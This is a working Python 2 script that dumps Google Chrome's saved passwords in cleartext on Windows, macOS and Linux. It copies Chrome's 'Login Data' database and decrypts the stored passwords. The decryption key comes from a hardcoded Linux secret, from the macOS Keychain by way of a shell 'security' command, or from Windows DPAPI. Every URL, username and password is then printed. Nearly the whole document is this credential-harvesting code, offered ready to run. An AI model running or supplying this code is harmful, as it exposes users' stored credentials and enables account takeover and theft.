"""
Get unencrypted 'Saved Password' from Google Chrome

Example:
    >>> import ChromePasswd
    >>> chrome_pwd = ChromePasswd()
    >>> print chrome_pwd.get_login_db
    /Users/x899/Library/Application Support/Google/Chrome/Default/
    
    >>> chrome_pwd.get_pass(prettyprint=True)
	{
		"data": [
			{
				"url": "https://x899.com/",
				"username": "admin",
				"password": "secretP@$$w0rD"
			},
			{
				"url": "https://accounts.google.com/",
				"username": "x899@gmail.com",
				"password": "@n04h3RP@$$m0rC1"
			}
		]
	}

TO DO:
    * Cookie support
    * Update database Password directly

"""


import platform
from getpass import getuser
from shutil import copy
import sqlite3
from os import unlink
import json
from importlib import import_module
import string
import sys


class ChromePasswd(object):
    """ Main ChromePasswd Class """

    def __init__(self):
        """ Constructor: determine target platform """
        self.target_os = platform.system()
        if self.target_os == 'Darwin':
            self.mac_init()
        elif self.target_os == 'Windows':
            self.win_init()
        elif self.target_os == 'Linux':
            self.linux_init()

    def import_libraries(self):
        """ import libraries based on underlying platform """
        try:
            if self.target_os == 'Darwin':
                globals()['AES'] = import_module('Crypto.Cipher.AES')
                globals()['KDF'] = import_module('Crypto.Protocol.KDF')
                globals()['subprocess'] = import_module('subprocess')

            elif self.target_os == 'Windows':
                globals()['win32crypt'] = import_module('win32crypt')

            elif self.target_os == 'Linux':
                globals()['AES'] = import_module('Crypto.Cipher.AES')
                globals()['KDF'] = import_module('Crypto.Protocol.KDF')
        except ImportError as err:
            print "[-] Error: {}".format(str(err))
            sys.exit()

    def linux_init(self):
        """ Linux Initialization Function """
        self.import_libraries()
        my_pass = 'peanuts'.encode('utf8')
        iterations = 1
        salt = b'saltysalt'
        length = 16

        self.key = KDF.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = (
            "/home/{}/.config/google-chrome/Default/".format(getuser()))
        self.decrypt_func = self.nix_decrypt

    def mac_init(self):
        """ Mac Initialization Function """
        self.import_libraries()
        my_pass = subprocess.Popen(
            "security find-generic-password -wa 'Chrome'",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True)
        stdout, _ = my_pass.communicate()
        my_pass = stdout.replace("\n", "")

        iterations = 1003
        salt = b'saltysalt'
        length = 16

        self.key = KDF.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = (
            "/Users/{}/Library/Application Support/Google/Chrome/Default/"
            .format(getuser()))
        self.decrypt_func = self.nix_decrypt

    def nix_decrypt(self, enc_passwd):
        """
        Linux and Mac's decryption function

        :paran enc_passwd: encrypted password
        :return: decrypted password
        """
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = AES.new(self.key, AES.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')

    def win_init(self):
        """ Windows Initialization Function """
        self.import_libraries()
        self.dbpath = (
            "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data"
            "\\Default\\".format(getuser()))
        self.decrypt_func = self.win_decrypt

    def win_decrypt(self, enc_passwd):
        """
        Window's decryption function

        :paran enc_passwd: encrypted password
        :return: decrypted password
        """
        data = win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)
        return data[1]

    @property
    def get_login_db(self):
        """ getting "Login Data" sqlite database path """
        return self.dbpath

    def get_pass(self, prettyprint=False):
        """
        Getting URL, username and password in clear text

        :param prettyprint: if it is True, output dictionary will be
                            printed on the screen
        :return: clear text data in dictionary format
        """
        copy(self.dbpath + "Login Data", "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute('''SELECT action_url, username_value, password_value
                        FROM logins''')
        data = {'data': []}
        for result in cursor.fetchall():
            _passwd = self.decrypt_func(result[2])
            passwd = ''.join(i for i in _passwd if i in string.printable)
            if result[1] or passwd:
                _data = {}
                _data['url'] = result[0]
                _data['username'] = result[1]
                _data['password'] = passwd
                data['data'].append(_data)
        conn.close()
        unlink("Login Data.db")

        if prettyprint:
            print json.dumps(data, indent=4)
        return data


def main():
    """ Operational Script """
    chrome_pwd = ChromePasswd()
    print chrome_pwd.get_login_db
    chrome_pwd.get_pass(prettyprint=True)


if __name__ == '__main__':
    main()
